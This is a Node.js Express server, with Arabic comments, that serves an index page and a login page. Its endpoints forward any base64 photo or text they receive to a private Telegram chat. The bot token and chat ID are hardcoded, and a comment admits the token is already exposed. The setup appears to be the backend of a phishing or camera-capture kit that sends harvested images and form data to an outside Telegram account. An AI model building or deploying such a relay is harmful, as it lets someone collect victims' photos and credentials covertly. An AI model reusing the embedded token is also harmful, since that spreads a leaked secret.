const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');

const app = express();

// ===== CORS =====
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    res.header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    next();
});

// ===== Body Parser =====
app.use(express.json({ limit: '50mb' }));

// ===== Static Files =====
app.use(express.static(path.join(__dirname)));

// ⚠️ حط توكن جديد (لا تستخدم القديم لأنه مكشوف)
const BOT_TOKEN = '8820755267:AAHMUktr3XDN_0RjFDM79NExy7ORssx-MdI';
const CHAT_ID = '6198785906';

// =======================
// 📸 إرسال صورة
// =======================
app.post('/send-photo', async (req, res) => {
    try {
        const { image, caption } = req.body;

        if (!image) {
            return res.status(400).json({ error: 'No image provided' });
        }

        const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'photo.jpg' });
        form.append('caption', caption || '📸 صورة جديدة');

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            form,
            {
                headers: form.getHeaders()
            }
        );

        console.log("Telegram response:", response.data);

        res.json({ success: true, data: response.data });

    } catch (error) {
        console.error("SEND PHOTO ERROR:");
        console.error(error.response?.data || error.message);

        res.status(500).json({
            error: error.response?.data || error.message
        });
    }
});

// =======================
// 💬 إرسال نص
// =======================
app.post('/send-data', async (req, res) => {
    try {
        const { caption } = req.body;

        if (!caption) {
            return res.status(400).json({ error: 'No caption provided' });
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: caption,
                parse_mode: 'HTML'
            }
        );

        console.log("Telegram response:", response.data);

        res.json({ success: true, data: response.data });

    } catch (error) {
        console.error("SEND DATA ERROR:");
        console.error(error.response?.data || error.message);

        res.status(500).json({
            error: error.response?.data || error.message
        });
    }
});

// =======================
// 🏠 الصفحة الرئيسية
// =======================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// =======================
// 🔐 صفحة تسجيل الدخول
// =======================
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// =======================
// 🚀 تشغيل السيرفر
// =======================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});